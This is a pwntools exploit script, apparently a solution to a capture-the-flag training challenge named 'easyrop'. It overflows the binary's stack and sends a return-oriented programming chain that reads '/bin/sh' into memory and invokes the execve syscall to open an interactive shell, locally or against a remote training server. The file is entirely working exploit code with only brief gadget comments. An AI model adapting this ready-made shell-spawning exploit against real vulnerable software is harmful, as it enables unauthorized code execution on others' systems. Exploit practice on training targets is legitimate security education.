from pwn import *

CHALL_PATH = "./easyrop"
CHALL = ELF(CHALL_PATH)
COMMANDS = """
b *0x401126
c
b *0x401134
c
"""

if args.GDB:
    p = gdb.debug(CHALL_PATH, COMMANDS)
elif args.REMOTE:
    p = remote("easyrop.training.offensivedefensive.it", 8080,ssl=True)
else:
    p = process(CHALL_PATH)

syscall = 0x401028 #syscall
pop_chain = 0x40108e #pop rdi ; pop rsi ; pop rdx ; pop rax ; ret
ret_main = 0x401168
deadbeef = 0xdeadbeef
pop_rbp = 0x401030 # : pop rbp ; ret
bss = 0x403091
mov_rbp = 0x40102d #mov eax, dword ptr [rbp - 4]; pop rbp; ret;
syscall_ret = 0x40107b # syscall; nop; pop rbp; ret;
#56/4 = 14
for i in range(int(14)):
    p.send(p32(0))
    p.send(p32(0))

#call read
payload = p32(pop_chain)
payload += p32(0)
payload += p32(0)
payload += p32(0)

payload += p32(0)
payload += p32(0)
payload += p32(0)
payload += p32(0)

payload += p32(bss)
payload += p32(0)
payload += p32(0)
payload += p32(0)

payload += p32(8)
payload += p32(0)
payload += p32(0)
payload += p32(0)

payload += p32(0)
payload += p32(0)
payload += p32(0)
payload += p32(0)

payload += p32(syscall_ret)
payload += p32(0)
payload += p32(0)
payload += p32(0)

payload += p32(0xdeadbeef)
payload += p32(0)
payload += p32(0)
payload += p32(0)

p.send(payload)

#pop chain
p.send(p32(pop_chain))
p.send(p32(0))
p.send(p32(0))
p.send(p32(0))

#rdi
p.send(p32(bss))
p.send(p32(0))
p.send(p32(0))
p.send(p32(0))

#rsi
p.send(p32(0))
p.send(p32(0))
p.send(p32(0))
p.send(p32(0))

#rdx
p.send(p32(0))
p.send(p32(0))
p.send(p32(0))
p.send(p32(0))

#rax
p.send(p32(0x3b))
p.send(p32(0))
p.send(p32(0))
p.send(p32(0))

#syscall
p.send(p32(syscall_ret))
p.send(p32(0))
p.send(p32(0))
p.send(p32(0))

p.send(p32(0xdeadbeef))
p.send(p32(0))
p.send(p32(0))
p.send(p32(0))

p.send(b"\n")
time.sleep(0.1)
p.send(b"\n")
time.sleep(0.1)
p.send(b"/bin/sh\x00")
#exit loop

p.interactive()
